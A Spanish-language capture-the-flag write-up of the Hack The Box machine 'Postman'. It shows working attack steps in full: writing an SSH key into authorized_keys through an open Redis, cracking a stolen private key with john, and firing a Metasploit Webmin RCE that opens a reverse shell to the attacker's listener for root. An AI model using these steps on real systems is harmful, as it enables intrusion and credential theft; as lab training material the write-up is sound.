---
tags:
title: Postman - Easy (HTB)
permalink: /Postman-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80,6379,10000 10.10.10.160
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 01:14 EDT
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.31s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.910
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.05 seconds
```

# Service enumeration

### HTTP - Port 80

Por el puerto `80` vemos una pagina web sin nada pero nada de contenido.

![Untitled 73](images/Untitled 73.jpg)

#### Feroxbuster enumeration

Y nuestro fuzzer no delata ninguna ruta importante en este puerto.

```bash
feroxbuster -u http://postman.htb
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.12.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://postman.htb
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ðŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.12.0
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ”ƒ  Recursion Depth       â”‚ 4
 ðŸŽ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      307c http://postman.htb/js => http://postman.htb/js/
301      GET        9l       28w      311c http://postman.htb/images => http://postman.htb/images/

200      GET        7l       27w     2317c http://postman.htb/upload/logo_02.png
200      GET       15l       60w     9039c http://postman.htb/upload/insta_04.jpg
200      GET       29l      152w    25241c http://postman.htb/upload/service_01.jpg
200      GET       42l      185w    56440c http://postman.htb/upload/hero_01.jpg
[####################] - 2m     30104/30104   0s      found:106     errors:1      
[####################] - 2m     30000/30000   222/s   http://postman.htb/ 
[####################] - 8s     30000/30000   3843/s  http://postman.htb/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   4753/s  http://postman.htb/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s     30000/30000   4646/s  http://postman.htb/upload/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 4s     30000/30000   6815/s  http://postman.htb/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   14245/s http://postman.htb/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   65502/s http://postman.htb/images/icons/ => Directory listing (add --scan-dir-listings to scan)
```

### HTTP - Port 10000

#### Enumeration

Por el puerto `10000` tambien es otra web donde se ve el nombre del servicio que lo hostea. (`Webmin`).

![{57E88253-4987-4D00-A3F0-3AF47C30497F}](images/{57E88253-4987-4D00-A3F0-3AF47C30497F}.png)

Pero sin embargo necesitamos si o si de alguna credenciales para loguearnos, debido a que intentos de `SQLI (Sql Injection)`, no sirven.
A pesar de esto podemos consultar en la base de datos de `metasploit` (`searchsploit`), para ver si quizas podamos encontrar algo interesante, mas en concreto desde la version 1.9 ya que es la version que corre como vimos en el escaneo de `nmap`.

```bash
searchsploit webmin 1.9                    
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                     | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                   | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                     | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                        | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                          | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                               | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                         | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                                                     | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                                                                               | linux/webapps/50998.py
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                             | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                             | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                            | linux/webapps/47330.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vemos varios, podriamos oscilar entre las versiones `1.910` y `.1920` ya que quizas no es tanta la diferencia de parches, vemos uno interesante el cual es el exploit `Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit) | linux/remote/46984.rb` el cual este si corresponde a la version que vimos en nuestro escaneo.
Podemos iniciar `metasploit`, para ver si se encuentra ahi.

```bash
msf > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

```

Vemos que si esta, con el identificador `7`, pero sin embargo para poder usar de el necesitamos de credenciales, ya que atenta contra el puerto `10000` por defecto que es donde ya vimos que es donde se aloja el servicio y por ende donde vimos que precisabamos de credenciales.

```bash
msf exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910



View the full module info with the info, or info -d command.
```

### Redis - Port 6379

Como vimos en nuestro escaneo en el puerto `6379` corre el servicio `redis`. En mi caso no se como auditarlo, por lo que recurri a este [recurso](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/6379-tcp-redis) donde se explica bien detallado el proceso, ya que ademas es de notar que corre la version `4.0.9` la cual es vulnerable.

>Esta vulnerabilidad tiene un impacto **CrÃ­tico** (CVSS: 10.0) y aplica a algunas versiones de Redis, incluyendo la serie 4.0, **pero solo en distribuciones Linux basadas en Debian y Ubuntu** (como Debian 9, 10, 11 y Ubuntu 20.04 LTS).

Ademas esta este [enlace](https://gist.github.com/ziednamouchi/d9b57abc1834d7ce3cf43d4d74479baa) a un PoC donde nos automatiza todo el proceso, Pero en mi caso voy a realizarlo de forma manual.

Primero necesitamos saber el directorio actual. Para eso usamos `config get dir`

## Shell as redis

```bash
redis-cli -h 10.10.10.160     
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> 
```

Ahora pasamos al siguiente paso que es crear nuestra publica `rsa` y con ella la clave privada `rsa`, con la cual nos autenticaremos mas adelante.

```bash
ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/.ssh/id_rsa
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase for "/root/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Jdo8bPuX5W430QISSwhDX0aDlUmgT+QfX0YpHgI00lo root@zsln
The key's randomart image is:
+---[RSA 3072]----+
|     .=+*OBo  .. |
|       BE+*.o..  |
|      .o=.o= oo  |
|      .B +oooo   |
|      . S ....  .|
|       . o    o..|
|        .    + ..|
|         .  o o..|
|          .. o...|
+----[SHA256]-----+

```

Listo ahora, siguiente paso, generar un nuevo archivo con algunas lineas de mas usando la clave publica. (`id_rsa.pub`)

```bash
(echo '\r\n\'; cat /root/.ssh/id_rsa.pub; echo  \'\r\n\') > /root/.ssh/public_key.txt
```

Ahora toca usar el parametro `-x` para indicarle que lean el ultimo argumento del `STDIN` e incluyan este ultimo valor en la base de datos, yo en mi caso con el parametro `flushall` elimine todos los datos de la base de datos, ya que previamente intenter usar el script pero me daba error.

```bash                                                     
redis-cli -h 10.10.10.160 flushall
OK
                                                  
cat /root/.ssh/public_key.txt | redis-cli -h 10.10.10.160 -x set cracklist
OK
```

Ahora le indico que los datos los guarde en la ruta `/.ssh` y que no use su ruta por defecto que es `/var/lib/redis`. Para luego decirle que use como archivo de base de datos `authorized_keys`, y por ultimo guardo los cambios.

```bash
redis-cli -h 10.10.10.160 set dir /var/lib/redis/.ssh/
OK

redis-cli -h 10.10.10.160 set dbfilename "authorized_keys"
OK                                                                                                                                  

redis-cli -h 10.10.10.160 save                            
OK                                                      
```

Ya una vez hecho esto podemos loguearnos usando la clave privada como archivo de identidad.

```bash
ssh -i /root/.ssh/id_rsa redis@10.10.10.160 
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ED25519 key fingerprint is SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160'' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

Y vemos que ahora somos el usuario `redis`.

## Shell as Matt

### Enumeration

Una vez dentro de la maquina como `redis`, vemos que no podemos visualizar la flag de user, ya que debemos si o si ser `matt`. Enumerando por todos los directorios de la maquina veo que en directorio `/opt` hay un archivo `.bak` de una clave `id_rsa` la cual podria pertenecerl al usuario `Matt`.

```bash
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ pwd
```

La transferimos a nuestra maquina usando `scp`.

```bash
scp -i /root/.ssh/id_rsa redis@10.10.10.160:/opt/id_rsa.bak .
id_rsa.bak                                                                                                                                               100% 1743     1.7KB/s   00:01
```

Y ahora convertimos el archivo a un hash el cual podamos romper con `john`.

```bash
ssh2john id_rsa.bak > id_hash
```

Lo rompemos para romper y descubrir la `password`.

```bash
john id_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)     
1g 0:00:00:00 DONE (2025-10-17 04:13) 12.50g/s 3085Kp/s 3085Kc/s 3085KC/s conta..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemso que como resultado nos da la password `computer2008`, asi que intentemos ver si le pertence a `Matt`.

```bash
ssh Matt@10.10.10.160             
Matt@10.10.10.160's password: 
Permission denied, please try again.
Matt@10.10.10.160's password:
```

Vemos que al intentar conectarnos remotamente fallamos asi que intentemos desde adentro de la maquina.

```bash
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ whoami
Matt
```

Ahora si somos `Matt` y podemos visuarlizar la flag de `user`.

## Shell as root

### Enumeration

enumerando todo el sistema como `Matt` vemos que tenemos los mismos limites que con el usuario `redis`, y usando de `linpeas.sh` tampoco logramos ver nada interesante, pero como ahora si disponemos de credenciales, intentemos loguearnos en la pagina del principio.

Credenciales.

`Matt:computer2008`

![Untitled 74](images/Untitled 74.jpg)

Vemos que con exito nos logueamos pero no vemos ninguna funcionalidad la cual podamso explotar en este servicio, pero podriamso ahora si intere el exploit que habiamos intentado usar al principio pero no lo hicimos debido a que no teniamos credenciales.

Seteamos toda la configuracion activando tambien la negociacio `TLS` debido a que tien un firmado esta pagina.

```bash
msf exploit(linux/http/webmin_packageup_rce) > options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
   RHOSTS     10.10.10.160     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.6       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910



View the full module info with the info, or info -d command.

msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.16.6:4444 
[+] Session cookie: d5947547ed8338f7166800f3af4b8a79
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.16.6:4444 -> 10.10.10.160:58280) at 2025-10-17 04:41:33 -0300
```

Una vez lo corremos vemos que con exito se inyecta el payload y nos abre una session.

```bash
sessions 1
[*] Session 1 is already interactive.
whoami
root
```

Y ahora si somos `root`. Ya podemos visualizar la flag.

```bash
cat /root/root.txt
d64f244277d8ca6fc64ba92a6046fc11
```

`~Happy Hacking.`